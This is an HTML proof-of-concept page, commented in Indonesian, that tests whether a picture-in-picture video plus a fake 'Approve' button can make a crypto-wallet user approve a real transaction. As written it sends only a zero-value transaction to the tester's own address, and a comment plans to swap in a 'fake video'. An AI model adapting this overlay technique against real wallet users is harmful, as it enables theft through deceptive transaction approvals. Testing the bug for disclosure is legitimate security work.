<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>pip test v2</title>
<style>
body{background:#000;color:#fff;font-family:system-ui;padding:12px;margin:0}
video{width:100%;background:#111;min-height:180px}
button{display:block;width:100%;padding:14px;margin:8px 0;background:#fff;color:#000;border:0;border-radius:8px;font-size:16px}
#log{font-size:12px;color:#999;white-space:pre-wrap;margin-top:10px}
#fake{display:none;position:fixed;left:0;right:0;bottom:0;background:#000;padding:12px;padding-bottom:30px}
small{color:#888}
</style>
</head>
<body>
<p><b>TEST - pip v2</b><br><small>test di wallet sendiri aja</small></p>

<video id="v" playsinline muted loop preload="auto"></video>

<button onclick="load()">1. load video dulu</button>
<button onclick="play()">2. play video</button>
<button onclick="pip()">3. masuk pip</button>
<button onclick="tx()">4. trigger tx 0 ke diri sendiri</button>
<button onclick="showfake()">5. munculin tombol palsu</button>

<div id="log">log:</div>

<div id="fake">
<button onclick="fakeclick()">Approve</button>
<small>ini tombol palsu. kalo diklik dan tx asli ikut ke approve, berarti bug.</small>
</div>

<script>
var logEl = document.getElementById("log");
function l(t){ logEl.textContent += "\n" + t; }
var v = document.getElementById("v");

function load(){
  // pake video yang pasti ada, jangan pake palsu.mp4 dulu buat ngetes pip-nya
  // kalo ini jalan, baru ganti ke video lu
  v.src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
  v.load();
  l("video di-load, tunggu sampai muncul gambarnya");
  v.oncanplay = function(){ l("video siap, klik play"); };
  v.onerror = function(){ l("video error, cek url / koneksi"); };
}

function play(){
  v.play().then(function(){ l("video jalan"); }).catch(function(e){ l("gagal play: " + e.message); });
}

function pip(){
  if(!v.paused && v.readyState > 1){
    try{
      v.webkitSetPresentationMode("picture-in-picture");
      l("masuk pip, sekarang geser pip-nya");
    }catch(e){ l("pip error: " + e.message); }
  }else{
    l("video belum jalan, play dulu baru pip");
  }
}

function tx(){
  window.ethereum.request({method:"eth_requestAccounts"}).then(function(a){
    l("connect: " + a[0].slice(0,6) + "..." + a[0].slice(-4));
    return window.ethereum.request({
      method:"eth_sendTransaction",
      params:[{from:a[0], to:a[0], value:"0x0"}]
    });
  }).then(function(h){ l("tx: " + h); })
  .catch(function(e){ l("tx gagal: " + e.message); });
}

function showfake(){
  document.getElementById("fake").style.display = "block";
  l("tombol palsu muncul");
}
function fakeclick(){
  l("klik palsu kepencet");
  alert("ini tombol palsu. cek apa tx asli ikut ke approve?");
}
</script>
</body>
</html>
